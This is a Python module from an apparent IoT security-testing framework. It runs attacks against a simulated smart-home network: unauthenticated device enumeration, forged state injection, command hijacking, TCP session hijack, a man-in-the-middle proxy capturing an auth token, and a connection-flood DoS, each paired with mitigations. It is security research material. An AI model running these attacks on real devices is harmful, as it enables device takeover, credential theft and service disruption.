"""
VESPER Network Attack Framework

Implements network-level attacks against the simulated IoT home network.
Targets communication protocols (Matter, TCP, Zigbee simulation) and
network infrastructure.

Attack Categories:
    1. Matter Attacks - Message injection, command hijacking, unauthorized access
    2. TCP/Transport Attacks - Man-in-the-middle, connection hijacking
    3. Protocol Attacks - Zigbee/Z-Wave key extraction, replay
    4. Network Infrastructure - ARP spoofing, DNS poisoning, DoS
    5. Traffic Analysis - Passive eavesdropping, pattern recognition

All attacks operate within the simulated network — no real network compromise.
"""

import socket
import time
import json
import logging
import random
import struct
import threading
import requests  # HTTP REST API attacks
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class NetworkAttackCategory(Enum):
    """Categories of network attacks."""
    MATTER_INJECTION = "matter_message_injection"
    MATTER_HIJACK = "matter_command_hijack"
    MATTER_SNIFF = "matter_eavesdropping"
    TCP_MITM = "tcp_man_in_the_middle"
    TCP_HIJACK = "tcp_connection_hijack"
    PROTOCOL_REPLAY = "protocol_replay"
    PROTOCOL_DOWNGRADE = "protocol_downgrade"
    ARP_SPOOF = "arp_spoofing"
    DNS_POISON = "dns_poisoning"
    NETWORK_DOS = "network_denial_of_service"
    TRAFFIC_ANALYSIS = "traffic_analysis"
    DEAUTH = "deauthentication_attack"
    EVIL_TWIN = "evil_twin_ap"


@dataclass
class NetworkAttackResult:
    """Result of a network attack attempt."""
    attack_name: str
    category: NetworkAttackCategory
    success: bool
    description: str
    evidence: List[str] = field(default_factory=list)
    impact: str = ""
    mitigation: str = ""
    intercepted_data: List[Dict] = field(default_factory=list)
    duration_ms: float = 0.0
    packets_sent: int = 0
    packets_captured: int = 0


@dataclass
class NetworkTarget:
    """Network attack target configuration."""
    # Matter bridge
    matter_bridge_url: str = "http://127.0.0.1:8484"
    # Target devices (host:port pairs) for TCP attacks
    devices: List[Tuple[str, int]] = field(default_factory=list)
    # Simulated network parameters
    gateway_ip: str = "172.20.0.1"
    subnet: str = "172.20.0.0/24"
    # Injected deps for traffic analysis
    wifi_emulator: Any = None  # WiFiEmulator instance for traffic capture
    hub: Any = None            # VirtualHub for hub-level attack routing
    # Real 802.11 attack backend (revision E-0). Must expose the
    # vesper.attacks.wifi_attacks.WiFiAttackFramework interface
    # (attack_arp_spoof / attack_dns_hijack / attack_deauth / attack_evil_twin).
    # When None, the infrastructure mechanisms are NOT executed (they used to
    # return a hardcoded success=True without doing anything).
    wifi_backend: Any = None
    wifi_target_station: str = "sta1"

    @property
    def broker_host(self) -> str:
        """Extract host from bridge URL (backward compat)."""
        return self.matter_bridge_url.split("//")[1].split(":")[0]

    @property
    def broker_port(self) -> int:
        """Extract port from bridge URL (backward compat)."""
        try:
            return int(self.matter_bridge_url.split(":")[-1].rstrip("/"))
        except ValueError:
            return 8484


class MatterAttackSuite:
    """
    Matter protocol attack suite targeting the REST API bridge at :8484.
    """

    def __init__(self):
        self.captured_messages: List[Dict] = []

    # ─── Attack: Unauthorized Device Enumeration ──────────────────

    def attack_unauthorized_subscribe(self, target: NetworkTarget) -> NetworkAttackResult:
        """Enumerate all devices from the REST API without authentication."""
        evidence = []
        captured = []
        try:
            resp = requests.get(
                f"{target.matter_bridge_url}/api/devices",
                timeout=5,
            )
            evidence.append(f"GET /api/devices → HTTP {resp.status_code}")
            if resp.status_code == 200:
                devices = resp.json()
                for d in devices:
                    captured.append(d)
                    evidence.append(
                        f"  Device: {d.get('id','?')} type={d.get('type','?')} "
                        f"room={d.get('room','?')}"
                    )
                evidence.append(f"Leaked {len(devices)} devices without authentication")
            else:
                evidence.append(f"Enumeration blocked: {resp.text[:100]}")
        except requests.exceptions.ConnectionError:
            evidence.append(f"Bridge unreachable at {target.matter_bridge_url}")
        except Exception as e:
            evidence.append(f"Error: {e}")

        success = len(captured) > 0
        return NetworkAttackResult(
            attack_name="Unauthorized Device Enumeration",
            category=NetworkAttackCategory.MATTER_SNIFF,
            success=success,
            description="Enumerate all IoT devices from REST API without credentials",
            evidence=evidence,
            impact="Full device inventory disclosure, vulnerability targeting",
            mitigation="Require API key / Bearer token on all REST endpoints",
            intercepted_data=captured,
            packets_captured=len(captured),
        )

    # ─── Attack: State Injection ───────────────────────────────────

    def attack_matter_message_injection(self, target: NetworkTarget) -> NetworkAttackResult:
        """Inject forged state into devices via unauthenticated PUT requests."""
        evidence = []
        injected = []

        # First enumerate devices to get real IDs
        device_ids = []
        try:
            r = requests.get(f"{target.matter_bridge_url}/api/devices", timeout=5)
            if r.status_code == 200:
                device_ids = [d["id"] for d in r.json()]
        except Exception:
            device_ids = ["kitchen-light-01", "motion-sensor-01", "smart-plug-01"]

        fake_payloads = [
            {"power": "on", "brightness": 100, "_forged": True},
            {"motion": True, "occupancy": True, "_forged": True},
            {"temperature": 99.9, "_forged": True},
        ]

        for device_id, payload in zip(device_ids[:3], fake_payloads):
            try:
                resp = requests.put(
                    f"{target.matter_bridge_url}/devices/{device_id}/state",
                    json=payload,
                    timeout=5,
                )
                injected.append({"device_id": device_id, "payload": payload})
                evidence.append(
                    f"PUT /devices/{device_id}/state → {resp.status_code}: "
                    f"{resp.text[:80]}"
                )
            except Exception as e:
                evidence.append(f"Injection failed for {device_id}: {e}")

        success = any("200" in e or "201" in e or "204" in e for e in evidence)
        return NetworkAttackResult(
            attack_name="Matter State Injection",
            category=NetworkAttackCategory.MATTER_INJECTION,
            success=success,
            description="Inject forged device states via unauthenticated PUT requests",
            evidence=evidence,
            impact="False sensor data triggers incorrect automations",
            mitigation="Authenticate all REST write endpoints (HMAC, Bearer token)",
            intercepted_data=injected,
            packets_sent=len(injected),
        )

    # ─── Attack: Command Hijack ────────────────────────────────────

    def attack_matter_command_hijack(self, target: NetworkTarget) -> NetworkAttackResult:
        """Send unauthorized commands to devices via the REST API."""
        evidence = []
        hijacked = []

        # Enumerate to get device IDs
        device_ids = []
        try:
            r = requests.get(f"{target.matter_bridge_url}/api/devices", timeout=5)
            if r.status_code == 200:
                device_ids = [d["id"] for d in r.json()]
        except Exception:
            device_ids = ["kitchen-light-01", "smart-plug-01"]

        attacker_cmds = [
            {"command": "setLevel", "level": 0},    # dim to 0 (effectively OFF)
            {"command": "toggleOnOff"},
        ]

        for device_id, cmd in zip(device_ids[:2], attacker_cmds):
            try:
                resp = requests.post(
                    f"{target.matter_bridge_url}/devices/{device_id}/command",
                    json=cmd,
                    timeout=5,
                )
                hijacked.append({"device_id": device_id, "command": cmd})
                evidence.append(
                    f"POST /devices/{device_id}/command → {resp.status_code}: "
                    f"{resp.text[:80]}"
                )
            except Exception as e:
                evidence.append(f"Command failed for {device_id}: {e}")

        success = any("200" in e or "202" in e for e in evidence)
        return NetworkAttackResult(
            attack_name="Matter Command Hijack",
            category=NetworkAttackCategory.MATTER_HIJACK,
            success=success,
            description="Send unauthorized control commands via unauthenticated REST API",
            evidence=evidence,
            impact="Attacker can turn off security devices, manipulate environment",
            mitigation="Require command authentication, implement Matter ACL fabric",
            intercepted_data=hijacked,
        )


class TCPAttackSuite:
    """
    TCP-level attacks targeting device firmware connections.
    """

    def _connect(self, host: str, port: int, timeout: float = 3.0) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        return sock

    # ─── Attack: TCP Connection Hijack ──────────────────────────────────

    def attack_tcp_connection_hijack(self, target: NetworkTarget) -> NetworkAttackResult:
        """
        Open a parallel TCP connection to the firmware to send commands
        while a legitimate controller is also connected.
        """
        if not target.devices:
            # Fall back to targeting the REST bridge port
            host = target.broker_host
            port = target.broker_port
            target = NetworkTarget(
                matter_bridge_url=target.matter_bridge_url,
                devices=[(host, port)],
            )
        
        host, port = target.devices[0]
        evidence = []
        
        try:
            # Attacker connects alongside legitimate connection
            attacker_sock = self._connect(host, port)
            
            # Send attacker commands
            attacker_sock.sendall(b"OFF\n")
            time.sleep(0.3)
            resp = attacker_sock.recv(4096).decode("utf-8", errors="replace")
            evidence.append(f"Attacker sent OFF, got: {resp[:60]}")
            
            # Verify control
            attacker_sock.sendall(b"GET_SWITCH\n")
            time.sleep(0.2)
            state = attacker_sock.recv(4096).decode("utf-8", errors="replace")
            evidence.append(f"Device state: {state[:60]}")
            
            attacker_sock.close()
            
            success = "off" in state.lower() or "SWITCH" in state
            if success:
                evidence.append("Hijack successful — attacker has device control")
                
        except Exception as e:
            evidence.append(f"Connection error: {e}")
            success = False
        
        return NetworkAttackResult(
            attack_name="TCP Connection Hijack",
            category=NetworkAttackCategory.TCP_HIJACK,
            success=success,
            description="Connect to device TCP port and send commands alongside legitimate controller",
            evidence=evidence,
            impact="Parallel control of device, command injection",
            mitigation="Mutual TLS, connection limits, session tokens",
        )

    # ─── Attack: TCP Man-in-the-Middle ──────────────────────────────────

    def attack_tcp_mitm_proxy(self, target: NetworkTarget) -> NetworkAttackResult:
        """
        Set up a proxy between controller and device to intercept/modify traffic.
        """
        if not target.devices:
            # Fall back to targeting the REST bridge port
            host = target.broker_host
            port = target.broker_port
            target = NetworkTarget(
                matter_bridge_url=target.matter_bridge_url,
                devices=[(host, port)],
            )
        
        host, port = target.devices[0]
        evidence = []
        intercepted = []
        proxy_port = port + 1000
        
        # Set up MITM proxy
        mitm_running = threading.Event()
        mitm_running.set()
        
        def mitm_proxy():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.settimeout(1.0)
                server.bind(("127.0.0.1", proxy_port))
                server.listen(1)
                
                while mitm_running.is_set():
                    try:
                        client, addr = server.accept()
                        # Connect to real device
                        device = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        device.settimeout(2.0)
                        device.connect((host, port))
                        
                        # Forward and intercept
                        client.settimeout(1.0)
                        while mitm_running.is_set():
                            try:
                                data = client.recv(4096)
                                if not data:
                                    break
                                intercepted.append({
                                    "direction": "client→device",
                                    "data": data.decode("utf-8", errors="replace")[:100],
                                    "timestamp": time.time(),
                                })
                                device.sendall(data)
                                
                                resp = device.recv(4096)
                                intercepted.append({
                                    "direction": "device→client",
                                    "data": resp.decode("utf-8", errors="replace")[:100],
                                    "timestamp": time.time(),
                                })
                                client.sendall(resp)
                            except socket.timeout:
                                continue
                        
                        client.close()
                        device.close()
                    except socket.timeout:
                        continue
                
                server.close()
            except Exception as e:
                evidence.append(f"Proxy error: {e}")
        
        # Start proxy
        proxy_thread = threading.Thread(target=mitm_proxy, daemon=True)
        proxy_thread.start()
        time.sleep(0.5)
        
        # "Victim" connects through proxy
        try:
            victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            victim.settimeout(3.0)
            victim.connect(("127.0.0.1", proxy_port))
            
            victim.sendall(b"STATUS\n")
            time.sleep(0.3)
            resp = victim.recv(4096).decode("utf-8", errors="replace")
            evidence.append(f"Proxied STATUS: {resp[:60]}")
            
            victim.sendall(b"AUTH:secret_token_123\n")
            time.sleep(0.3)
            resp = victim.recv(4096).decode("utf-8", errors="replace")
            evidence.append(f"Proxied AUTH: {resp[:60]}")
            
            victim.close()
        except Exception as e:
            evidence.append(f"Victim connection error: {e}")
        
        # Stop proxy
        mitm_running.clear()
        proxy_thread.join(timeout=2)
        
        success = len(intercepted) > 0
        if success:
            evidence.append(f"Intercepted {len(intercepted)} messages")
            # Check if we captured the auth token
            for msg in intercepted:
                if "AUTH:" in msg.get("data", ""):
                    evidence.append("AUTH TOKEN INTERCEPTED in transit!")
        
        return NetworkAttackResult(
            attack_name="TCP Man-in-the-Middle Proxy",
            category=NetworkAttackCategory.TCP_MITM,
            success=success,
            description="Proxy TCP connection to intercept commands and credentials",
            evidence=evidence,
            impact="Credential theft, command interception and modification",
            mitigation="Use TLS/mTLS for all device connections",
            intercepted_data=intercepted,
            packets_captured=len(intercepted),
        )

    # ─── Attack: TCP Connection Flood DoS ───────────────────────────────

    def attack_tcp_flood(self, target: NetworkTarget) -> NetworkAttackResult:
        """
        Flood device TCP port with connections to cause denial of service.
        """
        if not target.devices:
            # Fall back to targeting the REST bridge port
            host = target.broker_host
            port = target.broker_port
            target = NetworkTarget(
                matter_bridge_url=target.matter_bridge_url,
                devices=[(host, port)],
            )
        
        host, port = target.devices[0]
        evidence = []
        
        # Verify device is up
        try:
            pre_sock = self._connect(host, port)
            pre_sock.sendall(b"STATUS\n")
            pre = pre_sock.recv(256).decode()
            pre_sock.close()
            evidence.append(f"Pre-flood status: {pre[:50]}")
        except Exception as e:
            evidence.append(f"Pre-flood connection failed: {e}")
            return NetworkAttackResult(
                attack_name="TCP Connection Flood",
                category=NetworkAttackCategory.NETWORK_DOS,
                success=False,
                description=f"Device unreachable: {e}",
                evidence=evidence,
            )
        
        # Flood with connections
        flood_sockets = []
        flood_count = 50
        connected = 0
        
        for i in range(flood_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((host, port))
                s.sendall(b"A" * 100 + b"\n")
                flood_sockets.append(s)
                connected += 1
            except Exception:
                pass
        
        evidence.append(f"Opened {connected}/{flood_count} flood connections")
        
        # Test if legitimate connection works
        time.sleep(0.5)
        try:
            test_sock = self._connect(host, port, timeout=2.0)
            test_sock.sendall(b"STATUS\n")
            test_resp = test_sock.recv(256).decode()
            test_sock.close()
            evidence.append(f"Legitimate connection during flood: {test_resp[:50]}")
            success = "STATUS:OK" not in test_resp
        except Exception as e:
            evidence.append(f"Legitimate connection BLOCKED during flood: {e}")
            success = True
        
        # Cleanup
        for s in flood_sockets:
            try:
                s.close()
            except Exception:
                pass
        
        return NetworkAttackResult(
            attack_name="TCP Connection Flood DoS",
            category=NetworkAttackCategory.NETWORK_DOS,
            success=success,
            description=f"Open {flood_count} simultaneous TCP connections to exhaust resources",
            evidence=evidence,
            impact="Device unavailable to legitimate controllers",
            mitigation="Connection rate limiting, SYN cookies, connection pooling",
            packets_sent=flood_count,
        )


class ProtocolAttackSuite:
    """
    IoT protocol-level attacks (Zigbee, Z-Wave simulation).
    These attack the simulated protocol layer, not real wireless.
    """

    # ─── Zigbee mechanisms: REMOVED (revision E-0) ─────────────────────
    # The two former methods below returned a hardcoded success=True
    # (replay_success = True; success=True with a random "captured" key)
    # without transmitting or receiving anything. VESPER has no IEEE
    # 802.15.4 / Zigbee radio, so these mechanisms are out of scope and are
    # no longer part of run_all_attacks(). See
    # results/revision/e0_campaign/CHANGES.md.

    _ZIGBEE_OUT_OF_SCOPE = (
        "Out of scope: VESPER has no IEEE 802.15.4/Zigbee radio or Zigbee "
        "stack. The previous implementation returned a hardcoded success "
        "without executing anything; it was removed in revision E-0."
    )

    def attack_zigbee_replay(self, target: NetworkTarget) -> NetworkAttackResult:
        """Removed placeholder (no Zigbee radio). Always raises."""
        raise NotImplementedError(self._ZIGBEE_OUT_OF_SCOPE)

    def attack_zigbee_key_extraction(self, target: NetworkTarget) -> NetworkAttackResult:
        """Removed placeholder (no Zigbee radio). Always raises."""
        raise NotImplementedError(self._ZIGBEE_OUT_OF_SCOPE)

    # ─── Attack: Protocol Downgrade ─────────────────────────────────────

    def attack_protocol_downgrade(self, target: NetworkTarget) -> NetworkAttackResult:
        """
        Simulate forcing protocol downgrade from encrypted to unencrypted mode.
        """
        evidence = []
        
        # Attempt to connect without encryption
        evidence.append("Attempting connection without TLS/encryption")
        
        if target.devices:
            host, port = target.devices[0]
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3.0)
                sock.connect((host, port))
                sock.sendall(b"STATUS\n")
                resp = sock.recv(4096).decode("utf-8", errors="replace")
                sock.close()
                
                if "STATUS:OK" in resp:
                    evidence.append("Device accepts unencrypted TCP connections!")
                    evidence.append(f"Response: {resp[:60]}")
                    evidence.append("No TLS/SSL requirement — protocol downgrade trivial")
                    success = True
                else:
                    evidence.append(f"Device response: {resp[:60]}")
                    success = False
            except Exception as e:
                evidence.append(f"Connection failed: {e}")
                success = False
        else:
            evidence.append("No device targets available")
            success = False
        
        return NetworkAttackResult(
            attack_name="Protocol Downgrade (No Encryption)",
            category=NetworkAttackCategory.PROTOCOL_DOWNGRADE,
            success=success,
            description="Verify if devices accept unencrypted connections",
            evidence=evidence,
            impact="All traffic visible in plaintext, credential theft, command injection",
            mitigation="Require TLS 1.3 for all connections, reject unencrypted traffic",
        )


class NetworkInfraAttackSuite:
    """
    Network infrastructure mechanisms (ARP, DNS, deauth, evil twin).

    Revision E-0: the former "(Simulated)" methods returned a hardcoded
    success=True without sending a single frame. They now execute ONLY by
    delegating to a real 802.11 backend supplied as ``target.wifi_backend``
    (an object with the vesper.attacks.wifi_attacks.WiFiAttackFramework
    interface). Without a backend they raise NotImplementedError and
    NetworkAttackFramework.run_all_attacks() skips them, so no outcome is
    reported for a mechanism that did not run.
    """

    _NO_BACKEND = (
        "Not executed: this mechanism requires a real 802.11 backend "
        "(NetworkTarget.wifi_backend). The previous implementation returned "
        "a hardcoded success without executing anything (revision E-0)."
    )

    _CATEGORY = {
        "attack_arp_spoof": NetworkAttackCategory.ARP_SPOOF,
        "attack_dns_hijack": NetworkAttackCategory.DNS_POISON,
        "attack_deauth": NetworkAttackCategory.DEAUTH,
        "attack_evil_twin": NetworkAttackCategory.EVIL_TWIN,
    }

    def _delegate(self, target: NetworkTarget, method: str, **kwargs) -> NetworkAttackResult:
        if target.wifi_backend is None:
            raise NotImplementedError(self._NO_BACKEND)
        r = getattr(target.wifi_backend, method)(**kwargs)
        evidence = list(getattr(r, "evidence", []) or [])
        if getattr(r, "pcap_file", None):
            evidence.append(f"pcap: {r.pcap_file}")
        return NetworkAttackResult(
            attack_name=getattr(r, "attack_name", method),
            category=self._CATEGORY[method],
            success=bool(getattr(r, "success", False)),
            description=getattr(r, "description", ""),
            evidence=evidence,
            impact=getattr(r, "impact", ""),
            mitigation=getattr(r, "mitigation", ""),
            packets_sent=getattr(r, "packets_sent", 0),
            packets_captured=getattr(r, "packets_captured", 0),
        )

    def attack_arp_spoof(self, target: NetworkTarget) -> NetworkAttackResult:
        """ARP cache poisoning via the 802.11 backend (no backend -> raises)."""
        target_ip = target.devices[0][0] if target.devices else None
        kwargs = {"gateway_ip": target.gateway_ip}
        if target_ip:
            kwargs["target_ip"] = target_ip
        return self._delegate(target, "attack_arp_spoof", **kwargs)

    def attack_dns_poison(self, target: NetworkTarget) -> NetworkAttackResult:
        """DNS spoofing via the 802.11 backend (no backend -> raises)."""
        return self._delegate(target, "attack_dns_hijack")

    def attack_deauth(self, target: NetworkTarget) -> NetworkAttackResult:
        """802.11 deauthentication via the backend (no backend -> raises)."""
        return self._delegate(target, "attack_deauth", target_station=target.wifi_target_station)

    def attack_evil_twin(self, target: NetworkTarget) -> NetworkAttackResult:
        """Rogue AP via the backend (no backend -> raises)."""
        return self._delegate(target, "attack_evil_twin")


class TrafficAnalysisSuite:
    """
    Passive traffic analysis attacks.
    """

    def attack_traffic_fingerprinting(self, target: NetworkTarget) -> NetworkAttackResult:
        """
        Analyze traffic patterns to identify device types and activities
        without decrypting traffic (metadata analysis).
        """
        evidence = []
        fingerprints = []

        # ── WiFiEmulator-based traffic analysis (preferred) ─────────
        if target.wifi_emulator:
            try:
                records = target.wifi_emulator.traffic_tracker.get_recent(100)
                for rec in records:
                    # Analyze timing patterns, payload sizes, endpoint paths
                    fingerprints.append({
                        "device_id": rec.device_id,
                        "path": getattr(rec, 'path', ''),
                        "size": getattr(rec, 'payload_size', 0),
                        "timestamp": rec.timestamp,
                    })
                evidence.append(f"Captured {len(records)} WiFi traffic records via emulator")
            except Exception as e:
                evidence.append(f"WiFi traffic capture error: {e}")

        # ── Fallback: direct TCP fingerprinting ─────────────────────
        if target.devices:
            for host, port in target.devices:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    sock.connect((host, port))
                    
                    # Send IDENTIFY to profile the device
                    sock.sendall(b"IDENTIFY\n")
                    time.sleep(0.3)
                    resp = sock.recv(4096).decode("utf-8", errors="replace")
                    
                    # Analyze response pattern
                    fp = {
                        "endpoint": f"{host}:{port}",
                        "response_size": len(resp),
                        "has_device_type": "TYPE:" in resp,
                        "has_caps": "CAPS:" in resp,
                    }
                    
                    # Extract device type from response
                    for line in resp.split("\n"):
                        if line.startswith("TYPE:"):
                            fp["device_type"] = line.split(":")[1]
                        elif line.startswith("DEVICE:"):
                            fp["device_model"] = line.split(":")[1]
                        elif line.startswith("FIRMWARE:"):
                            fp["firmware_version"] = line.split(":")[1]
                    
                    fingerprints.append(fp)
                    evidence.append(f"Fingerprinted {host}:{port}: {json.dumps(fp)[:100]}")
                    
                    sock.close()
                except Exception as e:
                    evidence.append(f"Could not fingerprint {host}:{port}: {e}")
        
        evidence.append(f"Identified {len(fingerprints)} devices via traffic fingerprinting")
        evidence.append("Even encrypted traffic leaks: packet size, timing, frequency")
        
        return NetworkAttackResult(
            attack_name="Traffic Fingerprinting",
            category=NetworkAttackCategory.TRAFFIC_ANALYSIS,
            success=len(fingerprints) > 0,
            description="Passive traffic analysis to identify device types and firmware versions",
            evidence=evidence,
            impact="Device inventory disclosure, vulnerability targeting",
            mitigation="Traffic padding, random delays, encrypted metadata",
            intercepted_data=fingerprints,
        )


class NetworkAttackFramework:
    """
    Complete network attack framework for VESPER IoT security testing.
    
    Usage:
        target = NetworkTarget(
            matter_bridge_url="http://127.0.0.1:8484",
            devices=[("127.0.0.1", 15011), ("127.0.0.1", 15012)]
        )
        framework = NetworkAttackFramework()
        results = framework.run_all_attacks(target)
        framework.print_report(results)
    """

    def __init__(self):
        self.matter_suite = MatterAttackSuite()
        self.tcp_suite = TCPAttackSuite()
        self.protocol_suite = ProtocolAttackSuite()
        self.infra_suite = NetworkInfraAttackSuite()
        self.traffic_suite = TrafficAnalysisSuite()

    def run_all_attacks(self, target: NetworkTarget) -> List[NetworkAttackResult]:
        """Run all network attacks against the target."""
        results = []
        
        logger.info("Starting network attack suite...")
        
        # Matter attacks
        for attack in [
            self.matter_suite.attack_unauthorized_subscribe,
            self.matter_suite.attack_matter_message_injection,
            self.matter_suite.attack_matter_command_hijack,
        ]:
            logger.info(f"  Running: {attack.__name__}")
            results.append(self._timed(attack, target))
            time.sleep(0.3)
        
        # TCP attacks
        for attack in [
            self.tcp_suite.attack_tcp_connection_hijack,
            self.tcp_suite.attack_tcp_mitm_proxy,
            self.tcp_suite.attack_tcp_flood,
        ]:
            logger.info(f"  Running: {attack.__name__}")
            results.append(self._timed(attack, target))
            time.sleep(0.3)
        
        # Protocol attacks. The two Zigbee mechanisms were removed in
        # revision E-0 (hardcoded success, no Zigbee radio) and are not run.
        for attack in [
            self.protocol_suite.attack_protocol_downgrade,
        ]:
            logger.info(f"  Running: {attack.__name__}")
            results.append(self._timed(attack, target))
            time.sleep(0.2)
        
        # Infrastructure attacks: executed only with a real 802.11 backend.
        # Without one they are skipped (not reported as run/failed/succeeded).
        if target.wifi_backend is not None:
            for attack in [
                self.infra_suite.attack_arp_spoof,
                self.infra_suite.attack_dns_poison,
                self.infra_suite.attack_deauth,
                self.infra_suite.attack_evil_twin,
            ]:
                logger.info(f"  Running: {attack.__name__}")
                results.append(self._timed(attack, target))
                time.sleep(0.2)
        else:
            logger.warning("  Skipping ARP/DNS/deauth/evil-twin: no 802.11 backend "
                           "(NetworkTarget.wifi_backend) -- not executed")
        
        # Traffic analysis
        results.append(self._timed(self.traffic_suite.attack_traffic_fingerprinting, target))
        
        return results

    def _timed(self, func, *args) -> NetworkAttackResult:
        """Time an attack execution."""
        start = time.time()
        try:
            result = func(*args)
            result.duration_ms = (time.time() - start) * 1000
            return result
        except Exception as e:
            return NetworkAttackResult(
                attack_name=func.__name__,
                category=NetworkAttackCategory.TRAFFIC_ANALYSIS,
                success=False,
                description=f"Attack error: {e}",
                duration_ms=(time.time() - start) * 1000,
            )

    @staticmethod
    def print_report(results: List[NetworkAttackResult]):
        """Print formatted network attack report."""
        print("\n" + "=" * 80)
        print("  VESPER NETWORK SECURITY ASSESSMENT REPORT")
        print("=" * 80)
        
        total = len(results)
        successful = sum(1 for r in results if r.success)
        
        print(f"\n  Total Attacks: {total}")
        print(f"  Successful:    {successful} ({successful/total*100:.0f}%)")
        print(f"  Failed:        {total - successful}")
        
        # By category
        print("\n  By Category:")
        cats = {}
        for r in results:
            if r.category.value not in cats:
                cats[r.category.value] = {"total": 0, "success": 0}
            cats[r.category.value]["total"] += 1
            if r.success:
                cats[r.category.value]["success"] += 1
        
        for cat, counts in cats.items():
            print(f"    {cat:35s}: {counts['success']}/{counts['total']}")
        
        # Details
        print("\n" + "-" * 80)
        for i, r in enumerate(results, 1):
            status = "✓ VULNERABLE" if r.success else "✗ Not exploitable"
            print(f"\n  [{i:02d}] {r.attack_name}")
            print(f"       Category: {r.category.value}")
            print(f"       Status:   {status}")
            print(f"       Duration: {r.duration_ms:.1f}ms")
            if r.packets_sent:
                print(f"       Packets Sent: {r.packets_sent}")
            if r.packets_captured:
                print(f"       Packets Captured: {r.packets_captured}")
            print(f"       Description: {r.description}")
            if r.evidence:
                print(f"       Evidence:")
                for e in r.evidence[:5]:
                    print(f"         - {e[:100]}")
            if r.impact:
                print(f"       Impact: {r.impact}")
            if r.mitigation:
                print(f"       Mitigation: {r.mitigation}")
        
        print("\n" + "=" * 80)

    @staticmethod
    def export_results(results: List[NetworkAttackResult], filepath: str):
        """Export results to JSON."""
        data = []
        for r in results:
            data.append({
                "attack_name": r.attack_name,
                "category": r.category.value,
                "success": r.success,
                "description": r.description,
                "evidence": r.evidence,
                "impact": r.impact,
                "mitigation": r.mitigation,
                "duration_ms": r.duration_ms,
                "packets_sent": r.packets_sent,
                "packets_captured": r.packets_captured,
                "intercepted_data": r.intercepted_data,
            })
        
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)
